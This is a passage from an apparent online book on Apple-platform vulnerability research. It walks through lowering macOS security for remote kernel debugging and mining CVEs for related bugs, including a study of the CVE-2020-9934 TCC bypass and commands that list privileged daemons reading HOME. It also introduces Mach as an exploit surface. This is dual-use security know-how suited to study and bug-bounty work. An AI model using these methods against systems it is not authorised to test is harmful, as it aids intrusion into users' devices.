this.</p>"},{"location":"KernelDebugging/#disk-information","title":"Disk information","text":"<p>We shall do low level disk operations on our target machine, so first need to record the hardware device used for the root file system:</p> <pre><code>target-mbp2018 # df /\nFilesystem     512-blocks     Used Available Capacity iused     \n ifree %iused  Mounted on\n/dev/disk1s5s1 1953595632 59785248 469854808    12%  555854\n 9767422306    0%   /\n</code></pre> <p>This shows that in our case, we have APFS Container 1, Volume 5, Snapshot 1 representing the hard disk for the root file system.  So our disk (ignoring the snapshot) is <code>disk1s5</code>.</p>"},{"location":"KernelDebugging/#network-information","title":"Network information","text":"<p>We shall be connecting to the target via the Thunderbolt Gigabit Ethernet, so we need to know the Ethernet port name used for it.  First we connect our adapters to the machine, and then assuming there is only one Gigabit Ethernet port, we run the command:</p> <pre><code>target-mbp2018 # ifconfig | grep -B6 1000baseT\nen9: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu\n 1500\n    options=50b&lt;RXCSUM,TXCSUM,VLAN_HWTAGGING,AV,CHANNEL_IO&gt;\n    ether 28:ec:95:03:b3:a6 \n    inet6 fe80::18f5:dff5:a92b:d3ff%en9 prefixlen 64 secured\n scopeid 0x14 \n    inet 169.254.203.131 netmask 0xffff0000 broadcast\n 169.254.255.255\n    nd6 options=201&lt;PERFORMNUD,DAD&gt;\n    media: autoselect (1000baseT\n &lt;full-duplex,flow-control,energy-efficient-ethernet&gt;)\n</code></pre> <p>So our network interface is <code>en9</code> and our target machine appears on that interface as IP address <code>169.254.203.131</code>.</p>"},{"location":"KernelDebugging/#kernel-debug-flags","title":"Kernel Debug Flags","text":"<p>When we setup our target for debugging, to head off potential boot-time issues, we need to establish what custom boot flags we shall use for booting and debugging.  Technically speaking, these settings are tied to the particular kernel version we are debugging.  The settings, however, change only occasionally.</p> <p>Kernel information is available from the Open Source archives published by Apple. (@appleopensource)  We find that the release of such sources is delayed after the release of a given version of macOS.  iOS kernel source is not published.  However, it is macOS that is the most instructive because all the platforms are based on the same XNU kernel with just compile flag and device support differences.  The convergence of the platforms at a low level allows the macOS platform to give good insights into all Apple platforms.  We note, however, that the user experience is differentiated between the Apple platforms since the user needs to consume and experience the platform differently based upon the form factor of the system.  These differences are mainly manifest in the library software layers on top of the XNU kernel.</p> <p>At the time of writing, the latest Apple Open Source release for macOS is 11.2 despite our target machine being 20E5186d.  So we download its corresponding XNU kernel, <code>xnu-7195.81.3</code>.</p> <p>The file <code>osfmk/kern/debug.h</code> describes the boot parameters that are available.</p> <pre><code>/* Debug boot-args */\n#define DB_HALT         0x1\n//#define DB_PRT          0x2 -- obsolete\n#define DB_NMI          0x4\n#define DB_KPRT         0x8\n#define DB_KDB          0x10\n#define DB_ARP          0x40\n#define DB_KDP_BP_DIS   0x80\n//#define DB_LOG_PI_SCRN  0x100 -- obsolete\n#define DB_KDP_GETC_ENA 0x200\n\n#define DB_KERN_DUMP_ON_PANIC           0x400 /* Trigger core\n dump on panic*/\n#define DB_KERN_DUMP_ON_NMI             0x800 /* Trigger core\n dump on NMI */\n#define DB_DBG_POST_CORE                0x1000 /*Wait in debugger\n after NMI core */\n#define DB_PANICLOG_DUMP                0x2000 /* Send paniclog\n on panic,not core*/\n#define DB_REBOOT_POST_CORE             0x4000 /* Attempt to\n reboot after\n                                            * post-panic\n crashdump/paniclog\n                                            * dump.\n                                            */\n#define DB_NMI_BTN_ENA          0x8000  /* Enable button to\n directly trigger NMI */\n/* 0x10000 was DB_PRT_KDEBUG (kprintf kdebug events), feature\n removed */\n#define DB_DISABLE_LOCAL_CORE   0x20000 /* ignore local kernel\n core dump support */\n#define DB_DISABLE_GZIP_CORE    0x40000 /* don't gzip kernel core\n dumps */\n#define DB_DISABLE_CROSS_PANIC  0x80000 /* x86 only - don't\n trigger cross panics. Only\n                                     * necessary to enable\n x86 kernel debugging on\n                                     * configs with a\n dev-fused co-processor running\n                                     * release bridgeOS.\n                                     */\n#define DB_REBOOT_ALWAYS        0x100000 /* Don't wait for\n debugger connection */\n#define DB_DISABLE_STACKSHOT_TO_DISK 0x200000 /* Disable writing\n stackshot to local disk */\n</code></pre> <p>We require:</p> <ul> <li><code>DB_NMI</code>: we want to enter the debugger upon a Non-Maskable Interrupt</li> <li><code>DB_ARP</code>: we want the debugger communication to be over Address Resolution Protocol (in fact UDP packets)</li> <li><code>DB_NMI_BTN_ENA</code>: we want the power button being tapped to generate a Non-Maskable Interrupt</li> </ul> <p>Hence we shall plan on supplying the debug boot argument <code>debug=0x8044</code></p>"},{"location":"KernelDebugging/#assumed-configuration","title":"Assumed Configuration","text":"<p>For ease of explanation, we setup the following environmental variables matching our lab setup:</p> <pre><code>TARGET=target-mbp2018\nDISK=disk1s5\nKERNEL=20E5186d\nKDK=KDK_11.3_20E5186d.kdk\nNETWORK_INTERFACE=en9\n</code></pre>"},{"location":"KernelDebugging/#software-installation","title":"Software Installation","text":"<p>We need to install our software first because later steps will utilise it from Recovery Mode.</p>"},{"location":"KernelDebugging/#host-side-software","title":"Host side software","text":"<p>The host must install Xcode, and the specific KDK determined earlier.</p>"},{"location":"KernelDebugging/#target-side-software","title":"Target side software","text":"<p>The target must install the KDK determined earlier.</p>"},{"location":"KernelDebugging/#lowering-security","title":"Lowering Security","text":"<p>In order to debug our target we must lower the security settings.  (@installxnu) We have three tasks to do whilst booted into Recovery Mode.</p>"},{"location":"KernelDebugging/#disable-system-integrity-protection-sip","title":"Disable System Integrity Protection (SIP)","text":"<p>We need to disable System Integrity Protection (SIP) using the Configurable Security Restrictions Utility (<code>csrutil</code>).  Apple documentation @configsip tells us to:</p> <ol> <li>Boot into recovery mode (Command+R during boot)</li> <li>Launch a Terminal window from <code>Utilities &gt; Terminal</code>.</li> <li>Run <code>csrutil disable</code></li> <li>Quit the Terminal.</li> </ol>"},{"location":"KernelDebugging/#set-no-boot-security","title":"Set No Boot Security","text":"<p>We need to set boot security to No Security. (@startupsecurity)</p> <ol> <li>Launch <code>Utilities &gt; Startup Security Utility</code></li> <li>In section Secure Boot, set \"No Security\"</li> <li>Quit the Utility.</li> </ol>"},{"location":"KernelDebugging/#disable-authenticated-root-volume-security","title":"Disable Authenticated Root Volume Security","text":"<p>We need to disable authenticated Root Volume Security.  (@rootvolsecurity)</p> <ol> <li>Launch a Terminal window from <code>Utilities &gt; Terminal</code>.</li> <li>Run <code>csrutil authenticated-root disable</code> (Requires FileVault to be already disabled.)</li> <li>Quit the Terminal.</li> <li>Restart the computer.</li> </ol>"},{"location":"KernelDebugging/#configuring-the-development-kernel","title":"Configuring the Development Kernel","text":"<p>Having rebooted our target machine, with the lowered security, we can adjust our machine to use the Development Kernel.  This makes use of a kernel debugger easier since we have the kernel symbols for it that our debugger can use.</p>"},{"location":"KernelDebugging/#mount-read-write-the-root-file-system","title":"Mount Read Write the Root File System","text":"<pre><code>export TARGET=target-mbp2018 DISK=disk1s5 KERNEL=20E5186d\n NETWORK_INTERFACE=en9 KDK=KDK_11.3_20E5186d.kdk\nmkdir /tmp/mnt\nsudo mount -o nobrowse -t apfs /dev/$DISK /tmp/mnt\n</code></pre> <p>We should now have the root disk mounted Read Only and mounted Read Write <pre><code>target-mbp2018 # mount\n/dev/disk1s5s1 on / (apfs, sealed, local, read-only, journaled)\n.\n.\n/dev/disk1s5 on /private/tmp/mnt (apfs, sealed, local, journaled,\n nobrowse)\n</code></pre></p>"},{"location":"KernelDebugging/#install-the-development-kernel","title":"Install the Development Kernel","text":"<p>We place the development kernel on our system with:</p> <pre><code>sudo cp\n /Library/Developer/KDKs/$KDK/System/Library/Kernels/kernel.devel\nopment /tmp/mnt/System/Library/Kernels\n</code></pre>"},{"location":"KernelDebugging/#bless-the-root-file-system","title":"Bless the Root File System","text":"<p>We make our modified root file system bootable by the system by using the <code>bless</code> command.</p> <pre><code>sudo bless --folder /tmp/mnt/System/Library/CoreServices\n --bootefi --create-snapshot\n</code></pre>"},{"location":"KernelDebugging/#set-boot-parameters","title":"Set boot parameters","text":"<p>We need to set the boot parameters to use the development kernel.  We also need to make it:</p> <ol> <li>Use the thunderbolt ethernet adapter (<code>kdp_match_name=en9</code>),</li> <li>Not go to sleep when debugging (<code>wdt=-1</code>),</li> <li>Verbose boot for debugging (<code>-v</code>)</li> <li>Use Power Key for entering the debugger over UDP packets (<code>debug=0x8044</code>),</li> </ol> <p>In our lab configuration, this is done with:</p> <pre><code>export NETWORK_INTERFACE=en9\nsudo nvram boot-args=\"debug=0x8044\n kdp_match_name=$NETWORK_INTERFACE wdt=-1 -v\"\n</code></pre>"},{"location":"KernelDebugging/#target-machine-reboot","title":"Target machine reboot","text":"<p>Now we have everything in place. The target machine can be rebooted.  If we watch it reboot closely, we can see that as it reboots, a lot of debug information will be printed onto the screen as part of the reboot.</p>"},{"location":"KernelDebugging/#host-machine-configuration","title":"Host machine configuration","text":"<p>At this point we have a host machine with Xcode, and the KDK installed on it.  Only one further change is needed.</p> <p>The KDK comes with helper scripts to aid kernel debugging.  These are tied to the Python 2 runtime environment, but Xcode LLDB Debugger uses Python 3 as the default.  We need to switch to Python 2 as follows:</p> <pre><code>defaults write com.apple.dt.lldb DefaultPythonVersion 2\n</code></pre>"},{"location":"KernelDebugging/#interactive-debugging","title":"Interactive debugging","text":"<p>The host machine should be connected to the target machine.  It should have the KDK installed on it.  The Apple Spotlight feature will index it, and thus will be aware of the KDK symbols without it being explicitly told about them.</p> <p>On the target machine, we need to get the most recent IP address it has allocated for the Gigabit Ethernet interface <code>en9</code> (<code>$NETWORK_INTERFACE</code>).</p> <pre><code>target-mbp2018 # ifconfig en9\nen9: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu\n 1500\n    options=50b&lt;RXCSUM,TXCSUM,VLAN_HWTAGGING,AV,CHANNEL_IO&gt;\n    ether 28:ec:95:03:b3:a6 \n    inet6 fe80::14c8:8222:3ad9:82af%en9 prefixlen 64 secured\n scopeid 0x8 \n    inet 169.254.136.48 netmask 0xffff0000 broadcast\n 169.254.255.255\n    nd6 options=201&lt;PERFORMNUD,DAD&gt;\n    media: autoselect (1000baseT\n &lt;full-duplex,flow-control,energy-efficient-ethernet&gt;)\n    status: active\n</code></pre> <p>Here we have IP Address <code>169.254.136.48</code>.</p> <p>We now press the Power button on the target.  It must be a normal press, not a tap, nor a long press.  This will trigger the Non-Maskable Interrupt and freeze the machine, and it will then hunt for a kernel debugger connection.</p> <p>On the host machine, we run the following commands:</p> <pre><code>lldb\nkdp-remote 169.254.136.48\n</code></pre> <p>At this point we will get a large information dump from the target machine, detailing the kernel extensions currently running:</p> <pre><code>Version: Darwin Kernel Version 20.4.0: Wed Feb 10 23:06:18 PST\n 2021; root:xnu-7195.100.326.0.1~76/RELEASE_X86_64;\n UUID=04A94133-D929-3B0C-AF3D-907AF8BF4102;\n stext=0xffffff8010010000\nKernel UUID: 04A94133-D929-3B0C-AF3D-907AF8BF4102\nLoad Address: 0xffffff8010010000\nKernel slid 0xfe10000 in memory.\nLoaded kernel file\n /System/Volumes/Data/Library/Developer/KDKs/KDK_11.3_20E5186d.kd\nk/System/Library/Kernels/kernel\nwarning: 'kernel' contains a debug script. To run this script in\n this debug session:\n\n    command script import\n \"/System/Volumes/Data/Library/Developer/KDKs/KDK_11.3_20E5186d.k\ndk/System/Library/Kernels/kernel.dSYM/Contents/Resources/Python/k\nernel.py\"\n\nTo run all discovered debug scripts in this session:\n\n    settings set target.load-script-from-symbol-file true\n\nLoading 176 kext modules\n -----.-------.------....-------------.-----.--------------------\n-----.-----.-----------------------------------warning:\n 'IOGraphicsFamily' contains a debug script. To run this script\n in this debug session:\n\n    command script import\n \"/Library/Developer/KDKs/KDK_11.3_20E5186d.kdk/System/Library/Ex\ntensions/IOGraphicsFamily.kext.dSYM/Contents/Resources/Python/IOG\nraphicsFamily.py\"\n\nTo run all discovered debug scripts in this session:\n\n    settings set target.load-script-from-symbol-file true\n\n.----.-------------..-------------.------------------------------\nwarning: 'IOGraphicsFamily' contains a debug script. To run this\n script in this debug session:\n\n    command script import\n \"/Library/Developer/KDKs/KDK_11.3_20E5186d.kdk/System/Library/Ex\ntensions/IOGraphicsFamily.kext.dSYM/Contents/Resources/Python/IOG\nraphicsFamily.py\"\n\nTo run all discovered debug scripts in this session:\n\n    settings set target.load-script-from-symbol-file true\n\n done.\nFailed to load 161 of 176 kexts:\n com.apple.AGDCPluginDisplayMetrics                         \n 1B6E3133-91F9-3C8D-91E0-80843926DDE2\n com.apple.AppleFSCompression.AppleFSCompressionTypeDataless\n 94BB56D9-8BF2-3088-8B4F-5B57DA797346\n.\n.\n.\n com.apple.security.AppleImage4                             \n 2682857E-9FA5-3B36-A12C-104225C5EC80\n com.apple.security.quarantine                              \n FAADAF70-7DDD-38AC-962B-64776C8FA3CD\n com.apple.security.sandbox                                 \n 1947D7D5-5A3E-3F7D-83C1-641F2BB56D94\n com.apple.vecLib.kext                                      \n DE60F885-126D-3319-9683-CB4F0B8288A8\nkernel was compiled with optimization - stepping may behave\n oddly; variables may not be available.\nProcess 1 stopped\n* thread #1, stop reason = signal SIGSTOP\n    frame #0: 0xffffff801008b363\n kernel`DebuggerWithContext(reason=&lt;unavailable&gt;,\n ctx=&lt;unavailable&gt;, message=&lt;unavailable&gt;,\n debugger_options_mask=0) at debug.c:0 [opt]\nTarget 0: (kernel) stopped.\n</code></pre> <p>As instructed, we should run the debug scripts: <pre><code>settings set target.load-script-from-symbol-file true\n</code></pre></p> <p>So long as we have already set the Python version to 2 (earlier) we should see the scripts run successfully: <pre><code>Loading kernel debugging from\n /System/Volumes/Data/Library/Developer/KDKs/KDK_11.3_20E5186d.kd\nk/System/Library/Kernels/kernel.dSYM/Contents/Resources/Python/ke\nrnel.py\nLLDB version lldb-1200.0.44.2\nApple Swift version 5.3.2 (swiftlang-1200.0.45\n clang-1200.0.32.28)\nsettings set target.process.python-os-plugin-path\n \"/System/Volumes/Data/Library/Developer/KDKs/KDK_11.3_20E5186d.k\ndk/System/Library/Kernels/kernel.dSYM/Contents/Resources/Python/l\nldbmacros/core/operating_system.py\"\nTarget arch: x86_64\nInstantiating threads completely from saved state in memory.\nsettings set target.trap-handler-names hndl_allintrs\n hndl_alltraps trap_from_kernel hndl_double_fault\n hndl_machine_check _fleh_prefabt _ExceptionVectorsBase\n _ExceptionVectorsTable _fleh_undef _fleh_dataabt _fleh_irq\n _fleh_decirq _fleh_fiq_generic _fleh_dec\ncommand script import\n \"/System/Volumes/Data/Library/Developer/KDKs/KDK_11.3_20E5186d.k\ndk/System/Library/Kernels/kernel.dSYM/Contents/Resources/Python/l\nldbmacros/xnu.py\"\nxnu debug macros loaded successfully. Run showlldbtypesummaries\n to enable type summaries.\nsettings set target.process.optimization-warnings false\n</code></pre></p>"},{"location":"KernelDebugging/#simple-register-writing-test","title":"Simple register writing test","text":"<p>To prove to ourselves we have a live debuggable kernel we can run the following commands from llvm on the host.</p> <p>First we get the backtrace from where we've interrupted the Operating System: <pre><code>(lldb) bt\n* thread #2, name = '0xffffff86a4828898', queue = '0x0', stop\n reason = signal SIGSTOP\n  * frame #0: 0xffffff801008b363\n kernel`DebuggerWithContext(reason=&lt;unavailable&gt;,\n ctx=&lt;unavailable&gt;, message=&lt;unavailable&gt;,\n debugger_options_mask=0) at debug.c:0 [opt]\n    frame #1: 0xffffff80111a68da\n    frame #2: 0xffffff80107eeba1\n kernel`IOFilterInterruptEventSource::normalInterruptOccurred(thi\ns=0xffffff93712ca880, (null)=&lt;unavailable&gt;, (null)=&lt;unavailable&gt;,\n (null)=&lt;unavailable&gt;) at IOFilterInterruptEventSource.cpp:236:15\n [opt]\n    frame #3: 0xffffff8011130c51\n    frame #4: 0xffffff80111505a7\n    frame #5: 0xffffff801115496d\n    frame #6: 0xffffff8010815feb\n kernel`IOSharedInterruptController::handleInterrupt(this=0xfffff\nf937101f000, (null)=&lt;unavailable&gt;, nub=0xffffff937113ad80,\n (null)=&lt;unavailable&gt;) at IOInterruptController.cpp:830:5 [opt]\n    frame #7: 0xffffff80111bfa77\n    frame #8: 0xffffff8011126354\n    frame #9: 0xffffff801112f2fd\n    frame #10: 0xffffff80101c0ced kernel`interrupt [inlined]\n get_preemption_level at cpu_data.h:430:21 [opt]\n    frame #11: 0xffffff801002fbdd kernel`hndl_allintrs + 285\n    frame #12: 0xffffff80101c39ba kernel`machine_idle at\n pmCPU.c:235:1 [opt]\n    frame #13: 0xffffff80100b32c9\n kernel`processor_idle(thread=0x0000000000000000,\n processor=0xffffff8010ea9a40) at sched_prim.c:5346:3 [opt]\n    frame #14: 0xffffff80100b3498\n kernel`idle_thread(parameter=&lt;unavailable&gt;,\n result=&lt;unavailable&gt;) at sched_prim.c:5436:24 [opt]\n    frame #15: 0xffffff801002f13e kernel`call_continuation + 46\n</code></pre></p> <p>Next we read the current registers: <pre><code>(lldb) register read --all\nGeneral Purpose Registers:\n       rax = 0x0000000000000000\n       rbx = 0x0000000000000000\n       rcx = 0x0000000000000000\n       rdx = 0xffffff80111a6fb5\n       rdi = 0x0000000000000000\n       rsi = 0x0000000000000001\n       rbp = 0xffffffa062996de0\n       rsp = 0xffffffa062996db0\n        r8 = 0x0000000000000000\n        r9 = 0x0000000000000066\n       r10 = 0xffffff8011196720\n       r11 = 0xffffff8011196728\n       r12 = 0x0000000000000046\n       r13 = 0xffffff8010ea9a00  \n       r14 = 0x0000000000000000\n       r15 = 0x0000000000000001\n       rip = 0xffffff801008b363  kernel`DebuggerWithContext + 275\n at debug.c\n    rflags = 0x0000000000000046\n        cs = 0x0000000000000008\n        fs = 0x00000000ffff0000\n        gs = 0x0000000062990000\n\nFloating Point Registers:\n       fcw = 0x0000\n       fsw = 0x0000\n.\n.\n.\n</code></pre></p> <p>Next we write AAA.. into a register: <pre><code>(lldb) register write R8 0x4141414141414141\n(lldb) register read --all\nGeneral Purpose Registers:\n       rax = 0x0000000000000000\n       rbx = 0x0000000000000000\n       rcx = 0x0000000000000000\n       rdx = 0xffffff80111a6fb5\n       rdi = 0x0000000000000000\n       rsi = 0x0000000000000001\n       rbp = 0xffffffa062996de0\n       rsp = 0xffffffa062996db0\n        r8 = 0x4141414141414141\n        r9 = 0x0000000000000066\n.\n.\n</code></pre></p> <p>Next we store the original values in the R8 register: <pre><code>(lldb) register write R8 0x0\n</code></pre></p>"},{"location":"Leveraging/","title":"Leveraging Research","text":""},{"location":"Leveraging/#security-bulletins","title":"Security Bulletins","text":"<p>One strategy for learning and exploration is to stick on an old version of iOS for which we have a Jailbreak.  Then look at each security bulletin from Apple to see what vulnerabilities have been fixed.  Using the CVE number, it is easy to google for write-ups for these.  For example, search for \"CVE-2020\u20139934 poc\" meaning \"proof of concept for CVE-2020-9934\".  We should note, however, that only a minority of CVEs have an associated write-up.</p> <p>A list of security bulletins can be reached from iOS Version History.  Apple documents them in links of the form HT211288.  This particular example lists the vulnerability <pre><code>CVE-2020-9934: Matt Shockley (linkedin.com/in/shocktop)\n</code></pre> amongst many others for iOS 13.6 (iOS 13.6 produced an extremely long security bulletin).</p> <p>If we are lucky the newer exploit is applicable to our older iOS version.</p>"},{"location":"Leveraging/#bug-clustering","title":"Bug Clustering","text":"<p>Even if a new CVE is not applicable to our old iOS version, it can generate research ideas worth exploring.  When security bugs are found, often they are clustered, and perhaps only the instance of the bug in a Proof-of-Concept reported by the security researcher is addressed.  The adjacent bugs are sometimes ignored.</p> <p>Given that security bugs can be \"clustered\", a confirmed fix of any security bug can offer good research opportunities in neighbouring code or functionality.</p>"},{"location":"Leveraging/#keeping-to-a-promising-track","title":"Keeping to a promising track","text":"<p>No doubt, it takes a lot of perserverence to find a vulnerability.  We need to give ourselves the best chance of getting rewarded with a result because otherwise our motivation levels can wane.  If we think of bug hunting as a game, the best games are where the goal is reachable with some effort, but not beyond our abilities.</p> <p>Furthermore we need to keep things in balance.  Consider the example of programming in a new domain.  Randomly diving in, making elementary errors, and then constantly hitting the Stack Overflow website for answers is not productive.  At the opposite extreme, studying all the books in the domain area means we have knowledge but little resiliance.  We only know what we are taught.  And this material is easily forgotten due to a lack of practical reinforcement.</p> <p>For hacking to be a journey, we need to be willing just to try and experiment, and explore what we can.  Then back that up with formal reading, or exercises which build a specific skill, such as reverse engineering or Return-Oriented Programming.  But our experiments cannot be too random.  This is where following similar footsteps of others can help out.</p>"},{"location":"Leveraging/#studying-from-weakness","title":"Studying from Weakness","text":"<p>Another way of looking at things is to study the CWE.  The Common Weakness Enumeration goes through the classes of security errors that our made.  In the same way that learning design patterns gives us the mental langauge to observe and identify design issues and solutions in software, the CWE helps sharpen our eye for mistakes we want to exploit.</p> <p>We don't want to study a piece of code blindly and miss vulnerabilities.  It would be like propecting for gold, but not knowing what unprocessed natural gold deposits look like.</p>"},{"location":"Leveraging/#case-study-cve-2020-9934","title":"Case study CVE-2020-9934","text":"<p>The vulnerability, recorded as CVE-2020-9934, as found by Matt Shockley, and recorded in his write-up is a good example of how we can learn from weaknesses found by others.</p> <p>In brief, this vulnerability is that the Trust, Consent, and Control Framework (TCC) can be subverted through the use of maliciously supplied environmental variables.</p> <p>The weakness may be classified as CWE-20: Improper Input Validation.  This in turn is related to the Common Attack Pattern CAPEC-13: Subverting Environment Variable Values.</p> <p>We assume the reader has gone through this write-up.  Here we do a meta analysis; we look at the thinking that possibly went into the attack.</p> <p>We see that TCC is valuable because we want to attack sensitive resources without triggering User Interface pop-up dialogs asking for permission.</p> <p>TCC is controlled by entitlements.  Which entitlement?  Looking at the framework</p> <pre><code>codesign -d --entitlements - \\\n/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd\n\nExecutable=/System/Library/PrivateFrameworks/TCC.framework/Versions/A/Resources/tccd\n[Dict]\n    [Key] com.apple.private.tcc.manager\n    [Value]\n        [Bool] true\n    [Key] com.apple.rootless.storage.TCC\n    [Value]\n        [Bool] true\n    [Key] com.apple.fileprovider.acl-read\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.security.storage.TCC\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.system-extensions.tcc\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.kernel.global-proc-info\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.notificationcenterui.tcc\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.responsibility.set-arbitrary\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.coreservices.canmaplsdatabase\n    [Value]\n        [Bool] true\n    [Key] com.apple.private.tcc.allow\n    [Value]\n        [Array]\n            [String] kTCCServiceSystemPolicyAllFiles\n</code></pre> <p>The entitlement of interest is <code>com.apple.private.tcc.manager</code>.</p> <p>The attacker merely went straight for the <code>tccd</code> daemon.  This is the logical first choice.</p> <p>If this vulnerability is part of a cluster of bugs, we can find other potentially vulnerable daemons via a look up against the Entitlements Cross-Reference.  The specific query would be http://newosxbook.com/ent.jl?ent=com.apple.private.tcc.manager&amp;osVer=OSX.</p> <p>The full search results are tcc_manager_daemons.txt.</p> <p>We can search to occurences of \"HOME\" using: <pre><code>for item in $(cat tcc_manager_daemons.txt)\ndo\n    strings $item 2&gt;/dev/null | grep -l HOME --label $item \ndone\n</code></pre></p> <p>to yield: <pre><code>/System/Library/PrivateFrameworks/CloudDocsDaemon.framework/XPCServices/ContainerMetadataExtractor.xpc/Contents/MacOS/ContainerMetadataExtractor\n/System/Library/PrivateFrameworks/CloudKitDaemon.framework/Support/cloudd\n/System/Library/PrivateFrameworks/SyncedDefaults.framework/Support/syncdefaultsd\n/System/Library/PrivateFrameworks/TCC.framework/Versions/A/Resources/tccd\n/usr/bin/brctl\n/usr/libexec/fmfd\n/usr/libexec/pkd\n</code></pre></p> <p>All of these programs and daemons look interesting.  They are all privileged.  Some are obscure and lesser used functionality.  For example <code>brctl</code> appears to be a low level manipulation and diagnostics tool for iCloud.</p> <p>When exploring data-sensitive commands, it is best we establish a safe lab environment.  This is because we don't want to delete or damage our own production data.</p>"},{"location":"Leveraging/#digression-lab-machine-setup","title":"Digression: Lab machine setup","text":"<p>When we do static analysis we should use an \"orange\" environment.  This is a separate environment where we run tools against software to inspect them.</p> <p>When we do dynamic analysis we should use a \"red\" environment.  This is a separate environment where code is executed.</p> <p>A typical way to do things is to use an Intel-based Mac.  Install it with a special Apple ID used only for security research.  Potentially this could be a paid for Apple developer account that can be used to code sign binaries.</p> <p>Then create a Virtual Machine on the Mac and install it with a different Apple ID which is not connected with a paid developer account.  This whole machine should be snapshot-ed so experiments can be done and then the configuration reverted.</p>"},{"location":"Leveraging/#studying-brctl","title":"Studying <code>brctl</code>","text":"<p>In a red environment we can play around with the <code>brctl</code> command. If we create a file and directory structure: <pre><code>ParentFolder/sampleText.txt\n</code></pre> and this lives under the iCloud Drive of user <code>redtestsecure</code> we have <pre><code>/Users/redtestsecure/Library/Mobile Documents/com~apple~CloudDocs/\n</code></pre> as the root directory of <code>ParentFolder</code>.</p> <p>To throw away the local file <code>sampleText.txt</code> so as to tell iCloud that it would need to re-download the file (in contrast to propagating the deletion of the file to the cloud) we would run the command <pre><code>brctl evict ./sampleText.txt\n</code></pre> Immediately the cloud download icon would appear on the Finder GUI for this file.</p> <p>At this point we are ready to do some hacking.  We know there is at least some chance of a vulnerability through the HOME environmental variable since there was a prior bug using this approach.  We also know that this program is privileged so would definately produce valuable results if there was an exploit.  Access to sensitive data is called out for bug bounties on the Apple Bug bounty program.</p> <p>The next steps would be to learn more about the utility, and then study the program's internals via reverse engineering.</p> <p>Whilst we have not turned up an actual exploit so far, we have shared some insights for how a hacker would think about attacking, in this case, macOS.  Once we had an exploit then it might be possible to cross-leverage our knowledge to attack iOS.  Both systems use TCC.</p> <p>Going back to a theme raised at the beginning of our book, we could profit by having two projects on-going.  One project is hacking the system.  That is something destructive.  The other project is writing some application or software.  That is something constructive.</p> <p>So at this point, a good idea would be to develop an iCloud drive management program alongside our hacking research.  Apple don't provide any user interface to force synchronization of our files.  It happens \"by magic\" without any user side control knobs.</p> <p>This means that even if <code>brctl</code> does not turn up any good hacks, we might end up with a tool we could share or sell as part of the effort.  It is easy to see that this dual-approach would help keep us motivated along this journey.  We could switch between software engineering and hacking to maintain our interest.</p>"},{"location":"Mach/","title":"Mach Programming","text":""},{"location":"Mach/#motivation","title":"Motivation","text":"<p>The Operating Systems we know as iOS, macOS, tvOS, etc. are really different flavors of the Darwin Operating System.  The same code base but compiled with different macro preprocessor flags.</p> <p>The kernel of Darwin is XNU.  The fundamental interface to XNU is via the Mach programming interface.  At its core, XNU is based upon Mach messages.</p> <p>The reason why we want to do Mach programming is because it is an interface available from user mode that can affect, leak or subvert the XNU kernel since they share the same data abstractions and programming methodology.  Furthermore the fundamental abstractions are available as Open Source so can be inspected and understood easily.</p> <p>One way to think about Mach is to consider it a fundamental building block that can be used to build out an Operating System personality.</p> <p>Apple have created a UNIX personality for Darwin using Mach as an enabling technology.  That is why there seems to be two competing interfaces in Darwin, the Mach programming interface, and the UNIX syscall interface.</p> <p>It is straightforward to learn the UNIX syscall interface, because it follows the same paradigm as Linux.  There are therefore many books and example programs written against the UNIX syscall interface.  The details will vary but the approach is the same.</p> <p>The Mach programming interface is somewhat esoteric.  Apple seem to like to pretend that it does not exist.  Even experienced iOS programmers will know  little to nothing about it.  However, time and again, this interface will be used to build exploits, so it is something we shall learn.</p> <p>The original idea with Mach was to extend UNIX with new capabilities to tackle the emergence of multiprocessor systems and distributed computing more naturally.  The solution was to add a new set of messaging primitives; see A Programmer's Guide to the Mach System Calls</p> <p>When correctly coded, Mach based solutions can be elegant.  When incorrectly coded, Mach based code offers an expansive attack surface.  We shall study different techniques that abuse the Mach messaging system, such as Type Confusion.  Furthermore, Mach based attacks can be Data oriented attacks, which side-step the traditional mitigations in the Operating System (such as stack overflow protection and control flow integrity).</p>"},{"location":"Mach/#mach-fundamental-abstractions","title":"Mach Fundamental Abstractions","text":"<p>Mach is built upon the following abstractions:</p>    Entry Meaning     <code>task</code> An execution environment.   <code>thread</code> The basic unit of execution.   <code>port</code> A communication channel.   <code>message</code> A typed collection of data used for communication between threads.    <p>In the original formulation, tasks could be on the same machine, on different processors in the machine, or on different machines.  Such tasks become active entities when they host one or more threads.  And threads can communicate with each other using well-defined interfaces that are invariant to whether the recipient is on the same machine or on a different machine.</p> <p>In reality, due to the irrepressible properties of distributed communication, latency and reliability cannot be ignored.  Therefore, such a uniform communication abstraction cannot work out satisfactorily in real systems.  However, within a CPU with threads from the same task, or tasks in a parent-child relationship, the inherently well designed message passing abstraction comes into its own.  This is where the XNU kernel does its work and shines.</p>"},{"location":"Mach/#how-to-learn-mach-programming","title":"How to learn Mach programming","text":"<p>Mach is not so easy to learn.  There are few modern programs on GitHub to look at.  One way into the topic is to study the NEXTSTEP Mach documentation.  Despite its age, it is a well structured explanation of the concepts.  Another source of documentation are the header files on macOS.</p> <p>We can find the header file directory with: <pre><code># find /Applications/Xcode.app -type d -iname mach\n/Applications/Xcode.app/Contents/Developer/Platforms/AppleTVOS.pl\natform/Developer/SDKs/AppleTVOS.sdk/usr/include/mach\n/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.pla\ntform/Developer/SDKs/iPhoneOS.sdk/usr/include/mach\n.\n.\n.\n</code></pre></p> <p>Rather than duplicate or replace the NEXTSTEP documentation, we assume the reader will read all of that documentation, but for the practical work elements, refer to this book.  This book then acts as a modernization of the original materials.  As mentioned in the Introduction, this book is largely a tutorial guide to get us along the path to being able to find 0-day vulnerabilities.</p>"},{"location":"Mach/#memory-allocation","title":"Memory Allocation","text":"<p>Here we follow along the Mach documentation but with modernized code examples.  These are available at The Road to Zero GitHub in the subdirectory <code>source/mach-vm-alloc</code></p> <p>Here is code that demonstrates how to allocate memory with Mach, how to duplicate memory, and then how to free memory.</p> 